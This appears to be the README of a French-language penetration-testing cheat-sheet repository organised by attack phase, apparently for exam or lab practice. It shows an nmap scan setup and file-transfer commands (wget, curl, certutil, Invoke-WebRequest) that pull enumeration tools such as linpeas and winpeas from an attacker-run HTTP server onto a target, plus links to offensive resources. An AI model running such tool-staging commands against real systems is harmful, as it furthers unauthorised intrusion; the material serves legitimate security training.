# hkmv
All tools i need to start explore, have fun :)

Commandes prêtes à l'emploi, organisées par phase d'attaque.

## Fichiers

- `01_recon_enum` — Scanner, énumérer (Nmap, Gobuster, SMB, FTP, SSH)
- `02_exploitation` — Exploiter (SQLi, Hydra, Metasploit, LFI, Burp)
- `03_privesc_linux` — Escalader sur Linux (sudo, SUID, cron, capabilities)
- `04_privesc_windows` — Escalader sur Windows (services, tokens, PowerShell)
- `05_reverse_shells` — Obtenir un shell (Bash, Python, PHP, PowerShell, msfvenom)
- `06_post_exploitation` — Après accès (loot, transfert fichiers, hashcat, pivot)

## Premiers réflexes — J1

```bash
# 1. Créer la structure de travail
mkdir -p ~/exam/{screenshots,loot,notes}

# 2. Noter l'IP cible
export IP=10.10.10.10

# 3. Lancer le scan
nmap -sV -sC $IP -oN ~/exam/notes/scan.txt

# 4. Pendant le scan — noter les infos de base
echo "Target : $IP" >> ~/exam/notes/notes.txt
```

---

## Transfert de fichiers

**Serveur HTTP — ta machine (Kali)**
```bash
cd /chemin/vers/fichier
python3 -m http.server 8080
```

**Télécharger sur la cible**
```bash
# Linux
wget http://[IP_KALI]:8080/[fichier]
curl http://[IP_KALI]:8080/[fichier] -o [fichier]

# Exemple
wget http://10.10.10.10:8080/linpeas.sh

# Windows — certutil (CMD)
certutil -urlcache -split -f http://[IP_KALI]:8080/[fichier.exe] C:\Temp\[fichier.exe]

# Exemple
certutil -urlcache -split -f http://10.10.10.10:8080/winpeas.exe C:\Temp\winpeas.exe

# Windows — PowerShell
Invoke-WebRequest -Uri http://[IP_KALI]:8080/[fichier.exe] -OutFile C:\Temp\[fichier.exe]

# Exemple
Invoke-WebRequest -Uri http://10.10.10.10:8080/winpeas.exe -OutFile C:\Temp\winpeas.exe
```

---

## Références

| Phase | Besoin | URL |
|---|---|---|
| Recon | Wordlists | https://github.com/danielmiessler/SecLists |
| Recon | CVE & exploits | https://www.exploit-db.com |
| Recon | CVE détails | https://nvd.nist.gov |
| Exploitation | Payloads & bypasses | https://github.com/swisskyrepo/PayloadsAllTheThings |
| Exploitation | Guides pratiques par technique | https://www.hackingarticles.in |
| Exploitation | HackTricks (méthodologie) | https://book.hacktricks.xyz |
| Exploitation | Reverse shells et checklists | https://pentestmonkey.net |
| Exploitation | Générer un reverse shell | https://www.revshells.com |
| Privesc Linux | GTFOBins | https://gtfobins.github.io |
| Privesc Windows | LOLBAS | https://lolbas-project.github.io |
| Privesc AD | WADComs | https://wadcoms.github.io |
| Post-Exploitation | Identifier un hash | https://hashes.com/en/tools/hash_identifier |
| Post-Exploitation | Cracker un hash en ligne | https://crackstation.net |
| Post-Exploitation | CyberChef (encode/decode) | https://gchq.github.io/CyberChef |
